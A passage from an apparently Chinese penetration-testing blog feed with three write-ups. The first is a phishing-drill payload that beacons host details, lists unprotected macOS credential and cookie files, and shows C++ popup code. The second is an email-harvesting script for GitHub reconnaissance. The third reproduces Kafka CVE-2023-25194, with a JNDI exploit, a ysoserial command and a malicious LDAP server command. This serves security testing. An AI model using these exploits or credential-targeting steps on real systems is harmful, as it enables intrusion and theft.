Program以获得代码签名证书，费用为每年99美元。注册后，您可以签署您的应用程序并将其提交 Apple，在那里它将进行安全扫描并检查其他要求，例如强化运行时（在下一节中介绍）是否已启用。如果您提交恶意软件，Apple的安全扫描可能会忽略它并仍然公证您的应用程序，证书可能很快就会被吊销。</p><h4 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h4><p>Transparency, Consent, and Control(TCC)是在 v10.14+ 中实现的 macOS 隐私功能，当应用程序尝试访问某些资源（例如相机）和某些文件夹（包括 Desktop，Downloads，Documents和驱动器/卷）时，它会提示用户明确授予权限。尝试访问受TCC保护的资源而没有权限可能会有弹框提示，导致用户察觉到shell的存在。以下是一些未受TCC保护的有用文件：</p><ul><li>主目录中的隐藏文件和文件夹：<code>~/.aws/*</code>、<code>~/.ssh/*</code>、<code>~/.bash_history</code>、<code>~/.zsh_history</code></li><li>用户应用程序数据 — <code>〜/Library/Application Support/*</code></li><li>Cookie 文件 — <code>~/Library/Application Support/Google/Chrome/Default/Cookies</code> , <code>~/Library/Containers/com.tinyspeck.slackmacgap/Data/Library/Application Support/Slack/Cookies</code></li></ul><p>系统TCC数据库位于 /Library/Application Support/com.apple.TCC/TCC.db，每个用户都有一个位于 ~/Library/Application Support/com.apple.TCC/TCC.db 的TCC数据库。</p><h2 id="Windows下的EXE"><a href="#Windows下的EXE" class="headerlink" title="Windows下的EXE"></a>Windows下的EXE</h2><p>Windows下的Exe有两个功能:</p><ol><li>执行Exe的时候，获取用户名和主机名，回传发送到服务端</li><li>新建一个helo-world的定时任务，在某个时间点执行弹框Exe，弹窗告诉用户被入侵了</li></ol><p>定时任务直接找CSDN的例子，可以拿来用<a href="https://learn.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--c---">Time Trigger Example (C++</a>，弹窗的Exe代码如下:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token comment">// 窗口过程函数</span>LRESULT CALLBACK <span class="token function">WndProc</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT msg<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> WM_PAINT<span class="token operator">:</span>    <span class="token punctuation">&#123;</span>        PAINTSTRUCT ps<span class="token punctuation">;</span>        HDC hdc <span class="token operator">=</span> <span class="token function">BeginPaint</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置字体和颜色</span>        HFONT hFont <span class="token operator">=</span> <span class="token function">CreateFontW</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> FW_NORMAL<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> DEFAULT_CHARSET<span class="token punctuation">,</span> OUT_DEFAULT_PRECIS<span class="token punctuation">,</span> CLIP_DEFAULT_PRECIS<span class="token punctuation">,</span> DEFAULT_QUALITY<span class="token punctuation">,</span> DEFAULT_PITCH <span class="token operator">|</span> FF_SWISS<span class="token punctuation">,</span> L<span class="token string">"Arial"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SelectObject</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> hFont<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetTextColor</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> <span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetBkColor</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> <span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绘制文本</span>        <span class="token keyword">wchar_t</span> text<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token string">"您的电脑已被入侵，请提高信息安全意识，防止钓鱼邮件，ByeBye　:)"</span><span class="token punctuation">;</span>        RECT rect<span class="token punctuation">;</span>        <span class="token function">GetClientRect</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>rect<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DrawTextW</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> text<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>rect<span class="token punctuation">,</span> DT_CENTER <span class="token operator">|</span> DT_VCENTER <span class="token operator">|</span> DT_SINGLELINE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 清理资源</span>        <span class="token function">EndPaint</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DeleteObject</span><span class="token punctuation">(</span>hFont<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">case</span> WM_DESTROY<span class="token operator">:</span>        <span class="token function">PostQuitMessage</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token keyword">return</span> <span class="token function">DefWindowProc</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> wParam<span class="token punctuation">,</span> lParam<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> WINAPI <span class="token function">wWinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPWSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nCmdShow<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 注册窗口类</span>    WNDCLASSEXW wc <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WNDCLASSEXW<span class="token punctuation">)</span><span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>lpfnWndProc <span class="token operator">=</span> WndProc<span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>hInstance <span class="token operator">=</span> hInstance<span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> L<span class="token string">"MyWindowClass"</span><span class="token punctuation">;</span>    <span class="token function">RegisterClassExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>wc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 创建窗口</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        HWND hWnd <span class="token operator">=</span> <span class="token function">CreateWindowExW</span><span class="token punctuation">(</span>WS_EX_TOPMOST <span class="token operator">|</span> WS_EX_APPWINDOW<span class="token punctuation">,</span> L<span class="token string">"MyWindowClass"</span><span class="token punctuation">,</span> L<span class="token string">"如果有任何问题，请联系安全组 -- By "</span><span class="token punctuation">,</span> WS_OVERLAPPEDWINDOW<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">550</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> hInstance<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hWnd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">MessageBoxW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> L<span class="token string">"Failed to create window"</span><span class="token punctuation">,</span> L<span class="token string">"Error"</span><span class="token punctuation">,</span> MB_OK <span class="token operator">|</span> MB_ICONERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 显示窗口</span>        <span class="token function">ShowWindow</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> nCmdShow<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">UpdateWindow</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 消息循环</span>        MSG msg<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">GetMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">TranslateMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">DispatchMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述的Exe编译之后，再新建一个工程，把上面的exe当作资源文件，在运行的时候，释放到特定目录中，定时任务再执行这个文件。</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Github搜索小技巧</title>
      <link href="/2023/03/03/github-trick.html"/>
      <url>/2023/03/03/github-trick.html</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>获取了一个多人运动的git仓库，需要提取仓库里面所有的Email，然后根据Email搜一下Github是否存在对应的提交记录。这是一个很常见的问题，比如公司员工在提交gihtub的时候，没有注意修改提交的邮箱，很可能使用公司的邮箱进行提交。</p><h2 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h2><p>有两种方法可以提取一个仓库的所有邮箱：</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log <span class="token string">"--format=format:%ae"</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> shortlog -sea <span class="token operator">|</span> <span class="token function">grep</span> -E -o <span class="token string">"<span class="token entity" title="\b">\b</span>[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,6&#125;<span class="token entity" title="\b">\b</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print tolower($0)&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">|</span> <span class="token function">grep</span> -wv <span class="token string">'users.noreply.github.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后根据<a href="https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ">github小技巧</a>写一个批量获取邮箱的脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> random <span class="token keyword">import</span> choice<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeTOKEN_LISTS <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token string">""</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">search_commits</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>       headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/vnd.github+json"</span><span class="token punctuation">,</span>                   <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                  <span class="token punctuation">&#125;</span>       req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://api.github.com/search/commits'</span><span class="token punctuation">,</span>           <span class="token punctuation">&#123;</span><span class="token string">'q'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"committer-email:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>           headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>       <span class="token keyword">return</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># file = sys.argv[1]</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">"/tmp/email.txt"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>          <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                email <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>                token <span class="token operator">=</span> choice<span class="token punctuation">(</span>TOKEN_LISTS<span class="token punctuation">)</span>                                <span class="token keyword">try</span><span class="token punctuation">:</span>                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> search_commits<span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"total_count"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span>                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                     <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://nelson.cloud/scrape-contributor-emails-from-any-git-repository/">Scrape Contributor Emails From Any Git Repository</a></li><li><a href="https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ">github小技巧</a></li><li><a href="https://www.securitronlinux.com/debian-testing/how-to-get-a-listing-of-all-email-addresses-associated-with-a-github-repo/">How To Get A Listing Of All Email Addresses Associated With A Github Repo.</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache Kafka Connect JNDI注入漏洞复现(CVE-2023-25194)</title>
      <link href="/2023/02/14/kafka-rce.html"/>
      <url>/2023/02/14/kafka-rce.html</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><ul><li>影响版本：2.3.0 &lt;= Apache Kafka Connect &lt;= 3.3.2</li><li>修复建议: 升级至3.4.0版本</li><li>官方链接：<a href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地先启动kafka server:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz<span class="token function">tar</span> -xvf kafka_2.13-3.4.0.tgz //启动zk和kafkabin/zookeeper-server-start.sh config/zookeeper.propertiesbin/kafka-server-start.sh config/server.properties //创建一个测试topicbin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor <span class="token number">1</span> --partitions <span class="token number">1</span> --topic <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">KafkaProducer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">Producer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">ProducerRecord</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.mechanism"</span><span class="token punctuation">,</span> <span class="token string">"SCRAM-SHA-256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"security.protocol"</span><span class="token punctuation">,</span> <span class="token string">"SASL_SSL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.jaas.config"</span><span class="token punctuation">,</span><span class="token string">"com.sun.security.auth.module.JndiLoginModule "</span>                    <span class="token operator">+</span> <span class="token string">"required user.provider.url=\"ldap://0.0.0.0:1389/Exploit\" "</span>                    <span class="token operator">+</span> <span class="token string">"useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" "</span>                    <span class="token operator">+</span> <span class="token string">"group.provider.url=\"xxx\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Producer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pom.xml文件：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="生成反序列化数据"><a href="#生成反序列化数据" class="headerlink" title="生成反序列化数据"></a>生成反序列化数据</h3><p><code>java -jar ysuserial-1.3-su18-all.jar -g CommonsBeanutils1183NOCC -p &#39;open -a Calculator.app&#39; |base64|pbcopy</code></p><h3 id="LDAP托管数据"><a href="#LDAP托管数据" class="headerlink" title="LDAP托管数据"></a>LDAP托管数据</h3><p>使用<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">恶意LDAP</a>修改上一步生成的数据，然后启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  <span class="token number">0.0</span>.0.0 <span class="token number">8088</span> <span class="token number">1389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行代码，然后计算器就弹出来了</p><h2 id="测试中的问题"><a href="#测试中的问题" class="headerlink" title="测试中的问题"></a>测试中的问题</h2><p>在反序列化的测试中，尝试了这几种jndi框架，只有第二种可以执行其中命令，但是还不够完美，最后还是用su18师傅的<a href="https://github.com/su18/ysoserial">su18/ysoserial</a>生成之后用ldap托管靠谱。</p><ul><li><a href="https://github.com/Bl0omZ/JNDIEXP">https://github.com/Bl0omZ/JNDIEXP</a></li><li><a href="https://github.com/nu1r/JNDIExploit">https://github.com/nu1r/JNDIExploit</a></li><li><a href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></li></ul><p>考虑到一种黑盒的情形，假如在使用urldns发现存在cb链，攻击的时候可以用ysoserial生成不同的payload多尝试几次。</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用OpenResty进行域名流量劫持</title>
      <link href="/2023/02/13/cname-hijack-openresty.html"/>
      <url>/2023/02/13/cname-hijack-openresty.html</url>
      
